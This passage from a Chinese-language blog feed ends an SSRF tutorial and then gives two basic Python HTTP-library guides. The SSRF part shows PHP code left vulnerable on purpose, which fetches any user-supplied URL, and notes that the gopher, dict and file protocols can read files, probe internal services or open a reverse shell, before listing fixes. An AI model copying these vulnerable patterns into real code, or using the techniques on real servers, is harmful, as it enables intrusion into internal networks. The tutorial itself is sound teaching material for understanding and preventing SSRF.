alt="这是注释后"><br><img src="https://img-blog.csdnimg.cn/20200326131952608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="这是没注释的"></p></blockquote><p>然后通过 curl_exec 发起一个请求，<a href="https://www.php.cn/php-weizijiaocheng-364221.html" target="_blank" rel="noopener">curl_exec详细信息</a><br>然后这就是一个函数，接下来再设置一个get传参为变量url，然后再把这个变量url代入前面所创建的那个 curl函数</p><p><strong>2）file_get_contents()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'./images/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.img'</span><span class="token punctuation">;</span>\    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$img</span><span class="token operator">=</span><span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>file_get_content函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p><p><strong>3) fsockopen()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"$host"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"$errstr ($errno)&lt;br />\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">"GET / HTTP/1.1\r\n"</span><span class="token punctuation">;</span>    <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Host: $host\r\n"</span><span class="token punctuation">;</span>    <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>fsockopen</code>   函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p><p><strong>注意</strong><br><strong>1.</strong> 一般情况下PHP不会开启fopen的gopher wrapper<br><strong>2.</strong> file_get_contents的gopher协议不能URL编码<br><strong>3.</strong> file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br><strong>4.</strong> curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用<br><strong>5.</strong> curl_exec() //默认不跟踪跳转，<br><strong>6.</strong> file_get_contents()  //   file_get_contents支持  php://input协议</p><p><strong>2.协议</strong><br><strong>（1）file</strong>： 在有回显的情况下，利用 file 协议可以读取任意内容<br><strong>（2）dict</strong>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br><strong>（3）gopher</strong>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>（<strong>4）http/s</strong>：探测内网主机存活</p><h2 id="0x02-一些ssrf利用文章"><a href="#0x02-一些ssrf利用文章" class="headerlink" title="0x02.一些ssrf利用文章"></a>0x02.一些ssrf利用文章</h2><p><strong>1.</strong><a href="https://www.xd10086.com/posts/1516523858457311553/" target="_blank" rel="noopener">SSRF漏洞的利用与攻击内网应用实战</a><br><strong>2.</strong> <a href="https://mp.weixin.qq.com/s?__biz=MzI4NTE4NDAyNA==&mid=2650383259&idx=1&sn=68a01c433d744e94ebc14d568e2ac174&chksm=f3fd1aecc48a93fa27183525f9593efb43a172d1af2c690818cbda7d85a6334879a1b4df2bd6&scene=21#wechat_redirect" target="_blank" rel="noopener">Web安全基础学习之SSRF漏洞利用及绕过方式</a><br><strong>3.</strong><a href="https://mp.weixin.qq.com/s/ZL91c2YnHbIu75KG20eBJA" target="_blank" rel="noopener">挖洞达人必杀技之SSRF漏洞的利用与攻击内网应用实战</a></p><h2 id="0x03-修复方式"><a href="#0x03-修复方式" class="headerlink" title="0x03 修复方式"></a>0x03 修复方式</h2><p><strong>1.</strong>限制请求的端口，只能为web端口，只允许访问http 和 https的请求<br><strong>2.</strong>限制不能访问内网ip，以防止对内网进行攻击<br><strong>3.</strong>屏蔽 返回的详细信息</p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python中request模块的基本使用</title>
      <link href="/2020/032030464.html"/>
      <url>/2020/032030464.html</url>
      
        <content type="html"><![CDATA[<h2 id="Requests库的基础使用"><a href="#Requests库的基础使用" class="headerlink" title="Requests库的基础使用"></a>Requests库的基础使用</h2><p><strong>Get/Post请求</strong> </p><p>Get请求</p><pre class=" language-python"><code class="language-python"> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">,</span>参数<span class="token punctuation">)</span>        </code></pre><p>Post请求</p><pre class=" language-python"><code class="language-python"> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">,</span>参数<span class="token punctuation">)</span></code></pre><h3 id="0x01-响应体内容"><a href="#0x01-响应体内容" class="headerlink" title="0x01 .响应体内容"></a>0x01 .响应体内容</h3><table><thead><tr><th>用法</th><th>解释</th></tr></thead><tbody><tr><td><code>r.encoding</code></td><td>获取当前编码</td></tr><tr><td><code>r.encoding = ‘utf-8’</code></td><td>设置编码</td></tr><tr><td><code>r.text</code></td><td>以encoding解析返回内容。字符串方式的响应体，会根据响应头部的字符编码进行解码</td></tr><tr><td><code>r.content</code></td><td>以字节（二进制）返回。字节方式的响应体会自动为你解码gzip和deflate压缩</td></tr><tr><td><code>r.headers</code></td><td>以字典对象存储服务器响应头，但是字典比较特殊，字典键不区分大小写，若键不存在，则返回None</td></tr><tr><td><code>r.status_code</code></td><td>响应状态码 <em>特殊方法</em></td></tr><tr><td><code>r.json()</code></td><td>Requests 中内置的json解码器，以json形式返回内容，确保json格式，不然解析出错会抛异常</td></tr><tr><td><code>r.raise_for_status()</code></td><td>失败请求(非200响应) 抛出异常</td></tr></tbody></table><h3 id="0x02-进阶应用"><a href="#0x02-进阶应用" class="headerlink" title="0x02. 进阶应用"></a>0x02. 进阶应用</h3><p><strong>1.定制header/cookies 内容</strong></p><pre class=" language-python"><code class="language-python">header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">'User-Agent: Mozilla/5.0'</span><span class="token punctuation">}</span>cookie <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'key'</span><span class="token punctuation">:</span><span class="token string">'值'</span><span class="token punctuation">}</span>r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token operator">/</span>post<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span></code></pre><p><strong>2.设置http代理</strong></p><pre class=" language-python"><code class="language-python">proxies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'120.79.212.174'</span><span class="token punctuation">,</span><span class="token string">'https'</span><span class="token punctuation">:</span><span class="token string">'60.167.20.246'</span><span class="token punctuation">}</span>baidu <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span></code></pre><p>如果需要用户名密码验证</p><pre class=" language-python"><code class="language-python">proxies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'username:password@120.79.212.174'</span><span class="token punctuation">}</span>baidu <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span></code></pre><p><strong>3.基础身份认证</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> requests<span class="token punctuation">.</span>auth <span class="token keyword">import</span> HTTPBasicAuthurl <span class="token operator">=</span> <span class="token string">'https://qiyuanxuetang.net/hidden-basic-auth/user/passwd'</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>auth<span class="token operator">=</span>HTTPBasicAuth<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span><span class="token string">'passwd'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># r = requests.get(url=url,auth=('user','passwd') //简写</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="0x03-推荐阅读文章"><a href="#0x03-推荐阅读文章" class="headerlink" title="0x03.推荐阅读文章"></a>0x03.推荐阅读文章</h3><ol><li><a href="https://blog.csdn.net/qq_29286967/article/details/81025237" target="_blank" rel="noopener">request模块的深入和使用</a></li><li><a href="https://blog.csdn.net/weixin_44494778/article/details/93709582" target="_blank" rel="noopener">request基本使用</a><br>也可以看看官方解释</li></ol>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>urllib3模块的基本使用</title>
      <link href="/2020/032048346.html"/>
      <url>/2020/032048346.html</url>
      
        <content type="html"><![CDATA[<h2 id="urllib3模块的基本使用"><a href="#urllib3模块的基本使用" class="headerlink" title="urllib3模块的基本使用"></a>urllib3模块的基本使用</h2><hr>简单的请求get请求<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib3http <span class="token operator">=</span> urllib3<span class="token punctuation">.</span>PoolManager<span class="token punctuation">(</span><span class="token punctuation">)</span>baidu <span class="token operator">=</span> http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>baidu<span class="token punctuation">.</span>status<span class="token punctuation">)</span></code></pre><p>post请求</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib3http <span class="token operator">=</span> urllib3<span class="token punctuation">.</span>PoolManager<span class="token punctuation">(</span><span class="token punctuation">)</span>baidu <span class="token operator">=</span> http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>baidu<span class="token punctuation">.</span>status<span class="token punctuation">)</span></code></pre><h2 id="urllib3的其他拓展"><a href="#urllib3的其他拓展" class="headerlink" title="urllib3的其他拓展"></a>urllib3的其他拓展</h2><hr>### 1、最简单<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestresponse <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://python.org/'</span><span class="token punctuation">)</span>html <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="2、使用-Request"><a href="#2、使用-Request" class="headerlink" title="2、使用 Request"></a>2、使用 Request</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestreq <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span><span class="token string">'http://python.org/'</span><span class="token punctuation">)</span>response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>the_page <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="3、发送数据"><a href="#3、发送数据" class="headerlink" title="3、发送数据"></a>3、发送数据</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requesturl <span class="token operator">=</span> <span class="token string">'http://localhost/login.php'</span>user_agent <span class="token operator">=</span> <span class="token string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span>values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'act'</span> <span class="token punctuation">:</span> <span class="token string">'login'</span><span class="token punctuation">,</span><span class="token string">'login[email]'</span> <span class="token punctuation">:</span> <span class="token string">'yzhang@i9i8.com'</span><span class="token punctuation">,</span><span class="token string">'login[password]'</span> <span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">}</span>data <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span>req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'Referer'</span><span class="token punctuation">,</span> <span class="token string">'http://www.python.org/'</span><span class="token punctuation">)</span>response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>the_page <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>the_page<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="4、发送数据和header"><a href="#4、发送数据和header" class="headerlink" title="4、发送数据和header"></a>4、发送数据和header</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requesturl <span class="token operator">=</span> <span class="token string">'http://localhost/login.php'</span>user_agent <span class="token operator">=</span> <span class="token string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span>values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'act'</span> <span class="token punctuation">:</span> <span class="token string">'login'</span><span class="token punctuation">,</span><span class="token string">'login[email]'</span> <span class="token punctuation">:</span> <span class="token string">'yzhang@i9i8.com'</span><span class="token punctuation">,</span><span class="token string">'login[password]'</span> <span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">}</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'User-Agent'</span> <span class="token punctuation">:</span> user_agent <span class="token punctuation">}</span>data <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span>req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> headers<span class="token punctuation">)</span>response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>the_page <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>the_page<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="5、http-错误"><a href="#5、http-错误" class="headerlink" title="5、http 错误"></a>5、http 错误</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestreq <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span><span class="token string">'http://www.111cn.net '</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>HTTPError <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>code<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="6、异常处理1"><a href="#6、异常处理1" class="headerlink" title="6、异常处理1"></a>6、异常处理1</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> Request<span class="token punctuation">,</span> urlopen<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span> URLError<span class="token punctuation">,</span> HTTPErrorreq <span class="token operator">=</span> Request<span class="token punctuation">(</span><span class="token string">"http://www.111cn.net /"</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>response <span class="token operator">=</span> urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">except</span> HTTPError <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The server couldn'</span>t fulfill the request<span class="token punctuation">.</span>'<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error code: '</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>code<span class="token punctuation">)</span><span class="token keyword">except</span> URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'We failed to reach a server.'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Reason: '</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"good!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="7、异常处理2"><a href="#7、异常处理2" class="headerlink" title="7、异常处理2"></a>7、异常处理2</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> Request<span class="token punctuation">,</span> urlopen<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span>  URLErrorreq <span class="token operator">=</span> Request<span class="token punctuation">(</span><span class="token string">"http://www.111cn.net /"</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>response <span class="token operator">=</span> urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">except</span> URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token string">'reason'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'We failed to reach a server.'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Reason: '</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span><span class="token keyword">elif</span> hasattr<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The server couldn'</span>t fulfill the request<span class="token punctuation">.</span>'<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error code: '</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>code<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"good!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="8、HTTP-认证"><a href="#8、HTTP-认证" class="headerlink" title="8、HTTP 认证"></a>8、HTTP 认证</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token comment" spellcheck="true"># create a password manager</span>password_mgr <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>HTTPPasswordMgrWithDefaultRealm<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Add the username and password.</span><span class="token comment" spellcheck="true"># If we knew the realm, we could use it instead of None.</span>top_level_url <span class="token operator">=</span> <span class="token string">"https://www.111cn.net /"</span>password_mgr<span class="token punctuation">.</span>add_password<span class="token punctuation">(</span>None<span class="token punctuation">,</span> top_level_url<span class="token punctuation">,</span> <span class="token string">'rekfan'</span><span class="token punctuation">,</span> <span class="token string">'xxxxxx'</span><span class="token punctuation">)</span>handler <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>HTTPBasicAuthHandler<span class="token punctuation">(</span>password_mgr<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># create "opener" (OpenerDirector instance)</span>opener <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># use the opener to fetch a URL</span>a_url <span class="token operator">=</span> <span class="token string">"https://www.111cn.net /"</span>x <span class="token operator">=</span> opener<span class="token punctuation">.</span>open<span class="token punctuation">(</span>a_url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Install the opener.</span><span class="token comment" spellcheck="true"># Now all calls to urllib.request.urlopen use our opener.</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>install_opener<span class="token punctuation">(</span>opener<span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>a_url<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><h3 id="9、使用代理"><a href="#9、使用代理" class="headerlink" title="9、使用代理"></a>9、使用代理</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python3</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestproxy_support <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>ProxyHandler<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'sock5'</span><span class="token punctuation">:</span> <span class="token string">'localhost:1080'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>opener <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>proxy_support<span class="token punctuation">)</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>install_opener<span class="token punctuation">(</span>opener<span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://www.111cn.net "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><h3 id="10、超时"><a href="#10、超时" class="headerlink" title="10、超时"></a>10、超时</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token comment" spellcheck="true"># timeout in seconds</span>timeout <span class="token operator">=</span> <span class="token number">2</span>socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># this call to urllib.request.urlopen now uses the default timeout</span><span class="token comment" spellcheck="true"># we have set in the socket module</span>req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span><span class="token string">'http://www.111cn.net /'</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><h2 id="urllib3推荐文章"><a href="#urllib3推荐文章" class="headerlink" title="urllib3推荐文章"></a>urllib3推荐文章</h2><hr><p>因为我没怎么经常用urllib3这个模块<br>所以推荐一下别人的文章，写的不错</p><ol><li><a href="https://www.jianshu.com/p/d2f093ac01d6" target="_blank" rel="noopener">urllib和urllib3的使用</a></li><li><a href="https://www.cnblogs.com/springsnow/p/12118558.html" target="_blank" rel="noopener">Python HTTP客户端模块urllib、urllib3、requests库</a></li><li><a href="https://www.pianshen.com/article/820125448/" target="_blank" rel="noopener">python3下 urllib常用模块</a></li></ol><p>这三篇文章特别详细，比其他地方好多了<br>（<em>先保存，因为要写个自动化信息收集的工具，又要上班<br>果断时间再回来看</em>）</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
